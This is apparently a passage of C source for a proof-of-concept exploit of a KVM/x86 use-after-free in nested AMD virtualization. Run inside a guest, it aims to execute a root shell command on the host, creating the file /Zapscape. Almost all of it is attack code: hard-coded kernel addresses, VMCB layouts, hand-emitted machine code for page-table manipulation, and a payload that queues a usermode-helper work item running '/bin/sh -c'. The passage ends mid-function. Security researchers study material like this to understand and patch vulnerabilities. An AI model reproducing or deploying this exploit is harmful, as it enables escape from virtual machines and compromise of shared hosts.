/*
 * Guest-to-Host Escape in KVM/x86 (CVE-2026-64561)
 *
 * KVM x86 MMU mmu_page_zap_pte() recursive zap without a root_count guard -> active_mmu_pages use-after-free.
 *
 * Target: Linux x86_64, KVM AMD nested SVM/NPT before the recursive-zap root_count check.
 * Guest-side: gcc -O2 -g -static -pthread poc.c -o poc; run unprivileged in the guest; host gets /Zapscape as uid 0.
 *
 * Copyright (c) 2026 Hyunwoo Kim (@v4bel)
 */

#define SPARSE_PREFAULT_END 0x1fc00000u
#define SHIFT_LEAVES 8
_Static_assert((SPARSE_PREFAULT_END & 0x1fffffu) == 0,
	       "SMP sparse-prefault end must be 2MiB-aligned");
_Static_assert(0x20000000u - SPARSE_PREFAULT_END == 2u * 0x200000u,
	       "SMP reset branch must use the audited two-region count match");
#define POST_NPT_PML4 0x10467000u
#define DRAIN_LEAVES 510
#define H_GPA_BASE 0x0007d000u
#define G1_RELOC_TABLE 0x16000u
#define G1_RELOC_CODE 0x17000u
#define G1_RELOC_WAIT_CODE 0x18000u
#define G1_RELOC_POST_CODE 0x19000u
#define POC_MONITOR_CODE (G1_RELOC_WAIT_CODE + 0x200u)
#define POC_ACT_CODE (G1_RELOC_WAIT_CODE + 0x300u)
#define POC_ACT_SIZE 0x300u
#define POC_MONITOR_ENTERED (G1_MARKER + 173u)
#define POC_MONITOR_RETURNED (G1_MARKER + 174u)
#define HOST_MONITOR_ENTER_GPA POC_MONITOR_ENTERED
#define HOST_MONITOR_RETURN_TRAMPOLINE_GPA POC_MONITOR_CODE
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/kvm.h>
#ifndef GUEST_MEMFD_FLAG_MMAP
#define GUEST_MEMFD_FLAG_MMAP (1ULL << 0)
#define GUEST_MEMFD_FLAG_INIT_SHARED (1ULL << 1)
#endif
#define MSR_VM_HSAVE_PA 0xc0010117u
#define EFER_SVME (1u << 12)
#define EFER_LME (1u << 8)
#define G1_PAE_PDPT 0x0u
#define G1_PML4 0x1000u
#define G1_PDPT 0x2000u
#define G1_PD 0x3000u
#define G1_GDT 0x4000u
#define G1_GDTR 0x4f00u
#define G1_MARKER 0x4f20u
#define G1_HSAVE 0x5000u
#define G1_MSRPM 0x6000u
#define G1_IOPM 0x8000u
#define G1_PAE_PD 0xd000u
#define G1_CODE_A 0x10000u
#define G1_CODE_B 0x11000u
#define G1_SPRAY_CODE 0x12000u
#define G1_PREFLIGHT_END 0x13000u
#define G1_POST_CODE 0x1b000u
#define G1_HELPER_CODE 0x1c000u
#define G1_HELPER_CODE_SIZE 0x4000u
#define G1_VMCB 0x20000u
#define NPT_PML4 0x30000u
#define NPT_PDPT 0x31000u
#define NPT_PD 0x32000u
#define NPT_PT0 0x33000u
#define NPT_PAE 0x34000u
#define NPT_PD_MORE 0x35000u
#define NPT_PT_POOL 0x100000u
#define L2_CODE 0x40000u
#define L2_DATA 0x41000u
#define L2_QUOTA_BK 0x42000u
#define SPRAY_ARM (L2_DATA + 0x800u)
#define NPT_MAP_MAX 2047
#define SPRAY_START 0x1000000u
#define H_G1_HSAVE (H_GPA_BASE + 0x00000u)
#define H_G1_MSRPM (H_GPA_BASE + 0x01000u)
#define H_G1_IOPM (H_GPA_BASE + 0x03000u)
#define H_G1_VMCB (H_GPA_BASE + 0x06000u)
#define H_NPT_PML4 (H_GPA_BASE + 0x08000u)
#define H_NPT_PDPT (H_GPA_BASE + 0x09000u)
#define H_NPT_PD0 (H_GPA_BASE + 0x0a000u)
#define H_NPT_PD1 (H_GPA_BASE + 0x0b000u)
#define H_NPT_PT0 (H_GPA_BASE + 0x0c000u)
#define G_NPT_PML4 (H_GPA_BASE + 0x0d000u)
#define G_NPT_PDPT (H_GPA_BASE + 0x0e000u)
#define G_NPT_PD (H_GPA_BASE + 0x0f000u)
#define G_NPT_PT (H_GPA_BASE + 0x10000u)
#define H_L2_CODE (H_GPA_BASE + 0x20000u)
#define G_L2_CODE (H_GPA_BASE + 0x21000u)
#define H_L2_QUOTA_BK (H_GPA_BASE + 0x22000u)
#define G_NPT_PT1 (H_GPA_BASE + 0x23000u)
#define G_P1_L2_CODE (H_GPA_BASE + 0x24000u)
#define H_NPT_PT_POOL 0xa00000u
#define H_LEAVES 1001
#define H_INITIAL_LEAVES (H_LEAVES - SHIFT_LEAVES)
#define S_COUNT 10
#define S_NPT_BASE 0xe00000u
#define S_NPT_STRIDE 0x4000u
#define S_L2_CODE 0xe30000u
#define S_NPT_PML4(i) (S_NPT_BASE + (uint32_t)(i) * S_NPT_STRIDE)
#define S_NPT_PDPT(i) (S_NPT_PML4(i) + 0x1000u)
#define S_NPT_PD(i) (S_NPT_PML4(i) + 0x2000u)
#define S_NPT_PT(i) (S_NPT_PML4(i) + 0x3000u)
#define SHIFT_PD_BASE 0xe40000u
#define PHASE_B_PAE_ROOTS 3u
_Static_assert(
	PHASE_B_PAE_ROOTS == 3u,
	"the audited Linux 7.1.3 cache geometry requires three PAE roots");
#define POST_NPT_PDPT 0x79000u
#define POST_NPT_PD 0x7a000u
#define POST_NPT_PT 0x7b000u
#define POST_L2_CODE 0x7c000u
#define G_P1_NESTED_RIP 0x40000000u
#define KASLR_STATE (SPRAY_ARM + 0x100u)
#define KASLR_RECYCLE_PD 0x75000u
#define KASLR_RECYCLE_L2 0x76000u
#define KS_K_LO (KASLR_STATE + 0x00u)
#define KS_K_HI (KASLR_STATE + 0x04u)
#define KS_F_LO (KASLR_STATE + 0x08u)
#define KS_F_HI (KASLR_STATE + 0x0cu)
#define KS_N_GPA (KASLR_STATE + 0x10u)
#define KS_PASS_ARM (KASLR_STATE + 0x14u)
#define KS_PASS_EXIT (KASLR_STATE + 0x15u)
#define KS_PASS_REPAIR (KASLR_STATE + 0x16u)
#define KS_PASS_FREE (KASLR_STATE + 0x17u)
#define KS_STATUS (KASLR_STATE + 0x18u)
#define KS_EXPECT_LO (KASLR_STATE + 0x1cu)
#define KS_EXPECT_HI (KASLR_STATE + 0x20u)
#define KS_P_LO (KASLR_STATE + 0x24u)
#define KS_P_HI (KASLR_STATE + 0x28u)
#define KS_SLIDE (KASLR_STATE + 0x2cu)
#define KS_LOG_LO (KASLR_STATE + 0x30u)
#define KS_LOG_HI (KASLR_STATE + 0x34u)
#define KS_SRCU_LO (KASLR_STATE + 0x38u)
#define KS_SRCU_HI (KASLR_STATE + 0x3cu)
#define KS_UMH_LO (KASLR_STATE + 0x40u)
#define KS_UMH_HI (KASLR_STATE + 0x44u)
#define KS_TRACK_REQ (KASLR_STATE + 0x48u)
#define KS_TRACK_ACK (KASLR_STATE + 0x49u)
#define KS_M_READY (KASLR_STATE + 0x4au)
#define KS_E_READY (KASLR_STATE + 0x4bu)
#define KS_PAGING_OFF (KASLR_STATE + 0x4cu)
#define KS_C_HASH_LINKED (KASLR_STATE + 0x4du)
#define KS_QMAX_ORACLE (KASLR_STATE + 0x4eu)
#define KS_QMAX_C_REPAIRED (KASLR_STATE + 0x4fu)
#define KS_PAY_GPA (KASLR_STATE + 0x50u)
#define KS_PAY_HVA_LO (KASLR_STATE + 0x54u)
#define KS_PAY_HVA_HI (KASLR_STATE + 0x58u)
#define KS_ACTIVATION_ARM (KASLR_STATE + 0x5cu)
#define KS_SPLICE_READY (KASLR_STATE + 0x5du)
#define KS_WORK_QUEUED (KASLR_STATE + 0x5eu)
#define KS_ZERO_LO (KASLR_STATE + 0x64u)
#define KS_ZERO_HI (KASLR_STATE + 0x68u)
#define KS_C_PRE_E (KASLR_STATE + 0x6cu)
#define KS_UMH_COMPLETE (KASLR_STATE + 0x6du)
#define KS_WORK_NOOP_LO (KASLR_STATE + 0x70u)
#define KS_WORK_NOOP_HI (KASLR_STATE + 0x74u)
#define KS_EP_AUTOREMOVE_LO (KASLR_STATE + 0x78u)
#define KS_EP_AUTOREMOVE_HI (KASLR_STATE + 0x7cu)
#define KS_INIT_TASK_LO (KASLR_STATE + 0x80u)
#define KS_INIT_TASK_HI (KASLR_STATE + 0x84u)
#define KS_DISARM_STATUS (KASLR_STATE + 0x88u)
#define KS_UNLINK_ARM (KASLR_STATE + 0x89u)
#define KS_UNLINK_ICR (KASLR_STATE + 0x8au)
#define KS_UNLINK_DONE (KASLR_STATE + 0x8bu)
#define KHP_F 0x000u
#define KHP_W 0x028u
#define KHP_PATH 0x100u
#define KHP_ARG0 0x110u
#define KHP_ARG1 0x120u
#define KHP_SCRIPT 0x140u
#define KHP_ARGV 0x200u
#define KHP_ENVP 0x240u
#define KHP_COMPLETE 0x280u
#define KHP_SIZE 0x2d0u
#define KHP_SCRIPT_TEXT "umask 022; : > /Zapscape"
_Static_assert(KHP_SIZE <= 0x300u,
	       "N payload must not overwrite Q8's reciprocal slot at N+0x300");
_Static_assert(KS_UNLINK_DONE + 1u <= L2_QUOTA_BK,
	       "KASLR runtime state exceeds the L2 data page");
#define KVM_ACTIVE_HEAD_OFF 0x12b0u
#define KVM_PM_NOTIFIER_OFF 0x17e8u
#define KVM_NMAX_OFF 0x1290u
#define KVM_NMAX_PREV_OFF (KVM_NMAX_OFF - 8u)
#define KVM_PSEUDO_NODE_OFF (KVM_NMAX_OFF - 15u)
#define KVM_PSEUDO_ROLE_OFF (KVM_PSEUDO_NODE_OFF - 16u + 36u)
#define KVM_PSEUDO_FROM_H \
	((int32_t)KVM_PSEUDO_NODE_OFF - (int32_t)KVM_ACTIVE_HEAD_OFF)
#define KVM_F_FROM_H (KVM_PM_NOTIFIER_OFF - KVM_ACTIVE_HEAD_OFF)
_Static_assert(KVM_PSEUDO_NODE_OFF == 0x1281u && KVM_PSEUDO_ROLE_OFF == 0x1295u,
	       "Linux 7.1.3 pseudo-page geometry drifted");
_Static_assert(KVM_PSEUDO_FROM_H == -0x2f,
	       "Linux 7.1.3 pseudo-page hash delta drifted");
#define RCU_PM_NB_LINK 0xffffffff82f54c40ull
#define KASLR_IMAGE_MAX 0x40000000u
#define TARGET_ROLE_INVALID 0x0800u
#define TARGET_ROLE_DIRECT_L1 0x0081u
#define TARGET_ROLE_INVALID_DIRECT_L1 \
	(TARGET_ROLE_INVALID | TARGET_ROLE_DIRECT_L1)
#define EMPTY_ZERO_PAGE 0xffffffff83a24000ull
#define LOG_WAIT_HEAD 0xffffffff82f50998ull
#define SRCU_DELAY_TIMER 0xffffffff813eadb0ull
#define CALL_USERMODEHELPER_EXEC_WORK 0xffffffff81366be0ull
#define WORKQUEUE_NOOP 0xffffffff81823f00ull
#define EP_AUTOREMOVE_WAKE 0xffffffff81602250ull
#define INIT_TASK_SYMBOL 0xffffffff82e0ca00ull
#define WORK_STRUCT_NO_POOL_VALUE 0x000fffffffe00000ull
#define SPRAY1_END 0x04000000u
#define SPRAY2_START SPRAY1_END
#define SPRAY2_END 0x10000000u
#define SPRAY_GUEST_END SPRAY2_END
#define TARGET_GMEM_INDEX 0x161du
#define TARGET_PAGE_BASE (TARGET_GMEM_INDEX * 0x1000u)
#define TARGET_C_BASE (TARGET_GMEM_INDEX * 0x1000u + 0xf18u)
#define TARGET_P1_PTR (TARGET_C_BASE + 8u)
#define HOST_F_OFF 0x200u
#define HOST_HVA_LO (G1_MARKER + 96u)
#define HOST_HVA_HI (G1_MARKER + 100u)
#define SAFE_SPT_HVA_LO (G1_MARKER + 152u)
#define SAFE_SPT_HVA_HI (G1_MARKER + 156u)
#define INTERCEPT_HLT 120
#define INTERCEPT_VMRUN 128
#define INTERCEPT_VMMCALL 129
#define MAX_INTERCEPT 6
#define SVM_S (1u << 4)
#define SVM_P (1u << 7)
#define SVM_DB (1u << 10)
#define SVM_G (1u << 11)
struct __attribute__((packed)) vmcb_seg {
	uint16_t selector, attrib;
	uint32_t limit;
	uint64_t base;
};

struct __attribute__((packed)) vmcb_control_area {
	uint32_t intercepts[MAX_INTERCEPT];
	uint32_t reserved_1[15 - MAX_INTERCEPT];
	uint16_t pause_filter_thresh, pause_filter_count;
	uint64_t iopm_base_pa, msrpm_base_pa, tsc_offset;
	uint32_t asid;
	uint8_t tlb_ctl;
	uint8_t reserved_2[3];
	uint32_t int_ctl, int_vector, int_state;
	uint8_t reserved_3[4];
	uint32_t exit_code, exit_code_hi;
	uint64_t exit_info_1, exit_info_2;
	uint32_t exit_int_info, exit_int_info_err;
	uint64_t nested_ctl, avic_vapic_bar, ghcb_gpa;
	uint32_t event_inj, event_inj_err;
	uint64_t nested_cr3, virt_ext;
	uint32_t clean, reserved_5;
	uint64_t next_rip;
	uint8_t insn_len, insn_bytes[15];
	uint64_t avic_backing_page;
	uint8_t reserved_6[8];
	uint64_t avic_logical_id, avic_physical_id;
	uint8_t reserved_7[8];
	uint64_t vmsa_pa;
	uint8_t reserved_8[720];
	uint8_t reserved_sw[32];
};

struct __attribute__((packed)) vmcb_save_area {
	struct vmcb_seg es, cs, ss, ds, fs, gs, gdtr, ldtr, idtr, tr;
	uint8_t reserved_1[43];
	uint8_t cpl;
	uint8_t reserved_2[4];
	uint64_t efer;
	uint8_t reserved_3[112];
	uint64_t cr4, cr3, cr0, dr7, dr6, rflags, rip;
	uint8_t reserved_4[88];
	uint64_t rsp;
	uint8_t reserved_5[24];
	uint64_t rax, star, lstar, cstar, sfmask, kernel_gs_base, sysenter_cs,
		sysenter_esp, sysenter_eip, cr2;
	uint8_t reserved_6[32];
	uint64_t g_pat, dbgctl, br_from, br_to, last_excp_from, last_excp_to;
};

struct __attribute__((packed)) vmcb {
	struct vmcb_control_area control;
	struct vmcb_save_area save;
};

static void die(const char *m)
{
	fprintf(stderr, "%s: %s\n", m, strerror(errno));
	exit(1);
}

#define X(fd, req, arg, m)                   \
	do {                                 \
		if (ioctl(fd, req, arg) < 0) \
			die(m);              \
	} while (0)
static uint8_t *M;
static inline void w64(uint32_t gpa, uint64_t v)
{
	*(uint64_t *)(M + gpa) = v;
}

static inline void e8(uint8_t **p, uint8_t v)
{
	*(*p)++ = v;
}

static inline void e32(uint8_t **p, uint32_t v)
{
	memcpy(*p, &v, sizeof(v));
	*p += sizeof(v);
}

static inline void e64(uint8_t **p, uint64_t v)
{
	memcpy(*p, &v, sizeof(v));
	*p += sizeof(v);
}

static void emit32_store_imm(uint8_t **pp, uint32_t addr, uint32_t val)
{
	uint8_t *p = *pp;

	e8(&p, 0xc7);
	e8(&p, 0x05);
	e32(&p, addr);
	e32(&p, val);
	*pp = p;
}

static void emit32_store8_imm(uint8_t **pp, uint32_t addr, uint8_t val)
{
	uint8_t *p = *pp;

	e8(&p, 0xc6);
	e8(&p, 0x05);
	e32(&p, addr);
	e8(&p, val);
	*pp = p;
}

static void emit32_misaligned_child_zap(uint8_t **pp, uint32_t child_pt_page)
{
	uint8_t *p = *pp;

	e8(&p, 0xc6);
	e8(&p, 0x05);
	e32(&p, child_pt_page + 0xfffu);
	e8(&p, 0);
	*pp = p;
}

static void emit32_load_eax(uint8_t **pp, uint32_t addr)
{
	uint8_t *p = *pp;

	e8(&p, 0xa1);
	e32(&p, addr);
	*pp = p;
}

static void emit32_store_eax(uint8_t **pp, uint32_t addr)
{
	uint8_t *p = *pp;

	e8(&p, 0xa3);
	e32(&p, addr);
	*pp = p;
}

static void emit32_store64_imm(uint8_t **pp, uint32_t addr, uint64_t val)
{
	emit32_store_imm(pp, addr, (uint32_t)val);
	emit32_store_imm(pp, addr + 4, (uint32_t)(val >> 32));
}

static void emit32_vmrun_at(uint8_t **pp, uint32_t vmcb, uint32_t nested_cr3,
			    uint32_t rip)
{
	uint8_t *p = *pp;

	emit32_store64_imm(
		&p, vmcb + offsetof(struct vmcb_control_area, nested_cr3),
		nested_cr3);
	emit32_store64_imm(&p,
			   vmcb + offsetof(struct vmcb, save) +
				   offsetof(struct vmcb_save_area, rip),
			   rip);
	emit32_store64_imm(&p, vmcb + offsetof(struct vmcb_control_area, clean),
			   0);
	emit32_store64_imm(&p,
			   vmcb + offsetof(struct vmcb_control_area, exit_code),
			   0x89abcdefdeadbeefull);
	emit32_store64_imm(
		&p, vmcb + offsetof(struct vmcb_control_area, exit_info_1),
		0x1111222233334444ull);
	emit32_store64_imm(
		&p, vmcb + offsetof(struct vmcb_control_area, exit_info_2),
		0x5555666677778888ull);
	emit32_store64_imm(&p, G1_PAE_PDPT, (uint64_t)G1_PAE_PD | 0x1);
	e8(&p, 0xb8);
	e32(&p, vmcb);
	e8(&p, 0x0f);
	e8(&p, 0x01);
	e8(&p, 0xd8);
	*pp = p;
}

static void emit_fail_stop_loop(uint8_t **pp)
{
	e8(pp, 0xfa);
	e8(pp, 0xf4);
	e8(pp, 0xeb);
	e8(pp, 0xfd);
}

static void emit32_require_vmmcall(uint8_t **pp, uint32_t vmcb, uint8_t stage)
{
	uint8_t *p = *pp;

	e8(&p, 0x81);
	e8(&p, 0x3d);
	e32(&p, vmcb + offsetof(struct vmcb_control_area, exit_code));
	e32(&p, 0x81);
	e8(&p, 0x74);
	e8(&p, 0x0b);
	emit32_store8_imm(&p, SPRAY_ARM + 48, stage);
	emit_fail_stop_loop(&p);
	*pp = p;
}

static void emit64_store_imm(uint8_t **pp, uint64_t addr, uint64_t val)
{
	uint8_t *p = *pp;

	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, val);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, addr);
	*pp = p;
}

static void emit64_misaligned_child_zap(uint8_t **pp, uint32_t child_pt_page)
{
	uint8_t *p = *pp;

	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, child_pt_page + 0xfffu);
	e8(&p, 0);
	*pp = p;
}

static void emit64_flood_prepare_page(uint8_t **pp, uint32_t tracked_page)
{
	uint8_t *p = *pp;

	for (int i = 0; i < 3; i++) {
		e8(&p, 0xc6);
		e8(&p, 0x04);
		e8(&p, 0x25);
		e32(&p, tracked_page + 0xff8u);
		e8(&p, 0);
	}
	*pp = p;
}

static void emit_vmrun_h_root_at(uint8_t **pp, uint32_t nested_cr3,
				 uint32_t nested_rip);
static void emit64_require_h_vmmcall(uint8_t **pp, uint8_t stage);
static uint8_t *emit_rel32_jcc(uint8_t **pp, uint8_t cc)
{
	uint8_t *p = *pp, *disp;

	e8(&p, 0x0f);
	e8(&p, cc);
	disp = p;
	e32(&p, 0);
	*pp = p;
	return disp;
}

static uint8_t *emit_rel32_jmp(uint8_t **pp)
{
	uint8_t *p = *pp, *disp;

	e8(&p, 0xe9);
	disp = p;
	e32(&p, 0);
	*pp = p;
	return disp;
}

static void patch_rel32(uint8_t *disp, const uint8_t *target)
{
	intptr_t delta = target - (disp + 4);

	if (delta < INT32_MIN || delta > INT32_MAX) {
		errno = ERANGE;
		die("guest rel32");
	}
	*(int32_t *)disp = (int32_t)delta;
}

static void emit32_store_ptr_delta(uint8_t **pp, uint32_t dst, uint32_t src_lo,
				   uint32_t src_hi, int32_t delta)
{
	uint8_t *p = *pp;

	emit32_load_eax(&p, src_lo);
	if (delta >= 0) {
		e8(&p, 0x05);
		e32(&p, (uint32_t)delta);
		emit32_store_eax(&p, dst);
		emit32_load_eax(&p, src_hi);
		e8(&p, 0x83);
		e8(&p, 0xd0);
		e8(&p, 0x00);
	} else {
		e8(&p, 0x2d);
		e32(&p, (uint32_t)-delta);
		emit32_store_eax(&p, dst);
		emit32_load_eax(&p, src_hi);
		e8(&p, 0x83);
		e8(&p, 0xd8);
		e8(&p, 0x00);
	}
	emit32_store_eax(&p, dst + 4);
	*pp = p;
}

static void emit32_store_edi_imm(uint8_t **pp, uint32_t off, uint32_t val)
{
	uint8_t *p = *pp;

	e8(&p, 0xc7);
	e8(&p, 0x87);
	e32(&p, off);
	e32(&p, val);
	*pp = p;
}

static void emit32_store_edi64_imm(uint8_t **pp, uint32_t off, uint64_t val)
{
	emit32_store_edi_imm(pp, off, (uint32_t)val);
	emit32_store_edi_imm(pp, off + 4u, (uint32_t)(val >> 32));
}

static void emit32_load_edi_eax(uint8_t **pp, uint32_t off)
{
	uint8_t *p = *pp;

	e8(&p, 0x8b);
	e8(&p, 0x87);
	e32(&p, off);
	*pp = p;
}

static void emit32_atomic_install_edi64_abs(uint8_t **pp, uint32_t off,
					    uint32_t expected_lo,
					    uint32_t expected_hi,
					    uint32_t new_lo, uint32_t new_hi,
					    uint8_t **bad, unsigned int *nbad)
{
	uint8_t *p = *pp;

	emit32_load_eax(&p, expected_lo);
	e8(&p, 0x8b);
	e8(&p, 0x15);
	e32(&p, expected_hi);
	e8(&p, 0x8b);
	e8(&p, 0x1d);
	e32(&p, new_lo);
	e8(&p, 0x8b);
	e8(&p, 0x0d);
	e32(&p, new_hi);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x8f);
	e32(&p, off);
	uint8_t *installed = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, new_lo);
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x3b);
	e8(&p, 0x15);
	e32(&p, new_hi);
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	patch_rel32(installed, p);
	*pp = p;
}

static void emit32_atomic_install_edi64_zero(uint8_t **pp, uint32_t off,
					     uint32_t new_lo, uint32_t new_hi,
					     uint8_t **bad, unsigned int *nbad)
{
	uint8_t *p = *pp;

	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x31);
	e8(&p, 0xd2);
	e8(&p, 0x8b);
	e8(&p, 0x1d);
	e32(&p, new_lo);
	e8(&p, 0x8b);
	e8(&p, 0x0d);
	e32(&p, new_hi);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x8f);
	e32(&p, off);
	uint8_t *installed = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, new_lo);
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x3b);
	e8(&p, 0x15);
	e32(&p, new_hi);
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	patch_rel32(installed, p);
	*pp = p;
}

static void emit32_atomic_release_completion(uint8_t **pp, uint8_t owner,
					     uint8_t **bad, unsigned int *nbad)
{
	uint8_t *p = *pp;
	uint8_t *retry = p;

	emit32_load_edi_eax(&p, KHP_COMPLETE + 4u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *already_owned = emit_rel32_jcc(&p, 0x85);

	e8(&p, 0x8b);
	e8(&p, 0x97);
	e32(&p, KHP_COMPLETE + 8u);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, 1u);
	uint8_t *plain_locked = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, 0x101u);
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	patch_rel32(plain_locked, p);
	e8(&p, 0xbb);
	e32(&p, owner);
	e8(&p, 0x89);
	e8(&p, 0xd1);
	e8(&p, 0x81);
	e8(&p, 0xe1);
	e32(&p, 0xffffff00u);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x8f);
	e32(&p, KHP_COMPLETE + 4u);
	uint8_t *installed = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *lock_raced = emit_rel32_jcc(&p, 0x84);
	uint8_t *owner_check = p;

	e8(&p, 0x3d);
	e32(&p, 'A');
	uint8_t *accepted_a = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0x3d);
	e32(&p, 'B');
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	uint8_t *accepted = p;

	patch_rel32(already_owned, owner_check);
	patch_rel32(installed, accepted);
	patch_rel32(lock_raced, retry);
	patch_rel32(accepted_a, accepted);
	*pp = p;
}

static void emit32_mark_eax_ne_abs(uint8_t **pp, uint32_t expected)
{
	uint8_t *p = *pp;

	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, expected);
	uint8_t *equal = emit_rel32_jcc(&p, 0x84);

	emit32_store8_imm(&p, KS_DISARM_STATUS, 'f');
	patch_rel32(equal, p);
	*pp = p;
}

static void emit32_mark_eax_nonzero(uint8_t **pp)
{
	uint8_t *p = *pp;

	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *zero = emit_rel32_jcc(&p, 0x84);

	emit32_store8_imm(&p, KS_DISARM_STATUS, 'f');
	patch_rel32(zero, p);
	*pp = p;
}

static void emit32_store_edi_ptr_delta(uint8_t **pp, uint32_t off,
				       uint32_t src_lo, uint32_t src_hi,
				       int32_t delta)
{
	uint8_t *p = *pp;

	emit32_load_eax(&p, src_lo);
	if (delta >= 0) {
		e8(&p, 0x05);
		e32(&p, (uint32_t)delta);
		e8(&p, 0x89);
		e8(&p, 0x87);
		e32(&p, off);
		emit32_load_eax(&p, src_hi);
		e8(&p, 0x83);
		e8(&p, 0xd0);
		e8(&p, 0x00);
	} else {
		e8(&p, 0x2d);
		e32(&p, (uint32_t)-delta);
		e8(&p, 0x89);
		e8(&p, 0x87);
		e32(&p, off);
		emit32_load_eax(&p, src_hi);
		e8(&p, 0x83);
		e8(&p, 0xd8);
		e8(&p, 0x00);
	}
	e8(&p, 0x89);
	e8(&p, 0x87);
	e32(&p, off + 4u);
	*pp = p;
}

static void emit32_store_edi_string(uint8_t **pp, uint32_t off, const char *s)
{
	size_t n = strlen(s) + 1u;

	for (size_t i = 0; i < n; i += 4u) {
		uint32_t word = 0;
		size_t left = n - i;

		memcpy(&word, s + i, left < 4u ? left : 4u);
		emit32_store_edi_imm(pp, off + (uint32_t)i, word);
	}
}

static void emit32_build_kaslr_host_payload(uint8_t **pp)
{
	uint8_t *p = *pp;

	emit32_load_eax(&p, KS_N_GPA);
	emit32_store_eax(&p, KS_PAY_GPA);
	emit32_load_eax(&p, SAFE_SPT_HVA_LO);
	emit32_store_eax(&p, KS_PAY_HVA_LO);
	emit32_load_eax(&p, SAFE_SPT_HVA_HI);
	emit32_store_eax(&p, KS_PAY_HVA_HI);
	e8(&p, 0x8b);
	e8(&p, 0x3d);
	e32(&p, KS_PAY_GPA);
	e8(&p, 0xfc);
	e8(&p, 0xb9);
	e32(&p, KHP_SIZE / 4u);
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0xf3);
	e8(&p, 0xab);
	e8(&p, 0x8b);
	e8(&p, 0x3d);
	e32(&p, KS_PAY_GPA);
	emit32_store_edi_ptr_delta(&p, KHP_F + 16u, KS_SRCU_LO, KS_SRCU_HI, 0);
	emit32_store_edi_ptr_delta(&p, KHP_F + 24u, KS_LOG_LO, KS_LOG_HI, 0);
	emit32_store_edi64_imm(&p, KHP_W, WORK_STRUCT_NO_POOL_VALUE);
	emit32_store_edi_ptr_delta(&p, KHP_W + 8u, KS_PAY_HVA_LO, KS_PAY_HVA_HI,
				   KHP_W + 8u);
	emit32_store_edi_ptr_delta(&p, KHP_W + 16u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_W + 8u);
	emit32_store_edi_ptr_delta(&p, KHP_W + 24u, KS_UMH_LO, KS_UMH_HI, 0);
	emit32_store_edi_ptr_delta(&p, KHP_W + 32u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_COMPLETE);
	emit32_store_edi_ptr_delta(&p, KHP_W + 40u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_PATH);
	emit32_store_edi_ptr_delta(&p, KHP_W + 48u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_ARGV);
	emit32_store_edi_ptr_delta(&p, KHP_W + 56u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_ENVP);
	emit32_store_edi_imm(&p, KHP_W + 64u, 2u);
	emit32_store_edi_string(&p, KHP_PATH, "/bin/sh");
	emit32_store_edi_string(&p, KHP_ARG0, "sh");
	emit32_store_edi_string(&p, KHP_ARG1, "-c");
	emit32_store_edi_string(&p, KHP_SCRIPT, KHP_SCRIPT_TEXT);
	emit32_store_edi_ptr_delta(&p, KHP_ARGV + 0u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_ARG0);
	emit32_store_edi_ptr_delta(&p, KHP_ARGV + 8u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_ARG1);
	emit32_store_edi_ptr_delta(&p, KHP_ARGV + 16u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_SCRIPT);
	emit32_store_edi_imm(&p, KHP_COMPLETE + 8u, 1u);
	emit32_store_edi_ptr_delta(&p, KHP_COMPLETE + 16u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_COMPLETE + 16u);
	emit32_store_edi_ptr_delta(&p, KHP_COMPLETE + 24u, KS_PAY_HVA_LO,
				   KS_PAY_HVA_HI, KHP_COMPLETE + 16u);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	*pp = p;
}

static void emit32_arm_hash_c_host_effect(uint8_t **pp)
{
	uint8_t *p = *pp;

	emit32_store_ptr_delta(&p, TARGET_C_BASE, G1_MARKER + 64u,
			       G1_MARKER + 68u, -152);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 8u, G1_MARKER + 64u,
			       G1_MARKER + 68u, -152);
	emit32_store_imm(&p, TARGET_C_BASE + 32u, 0x01000001u);
	for (uint32_t off = 40u; off < 48u; off += 4u)
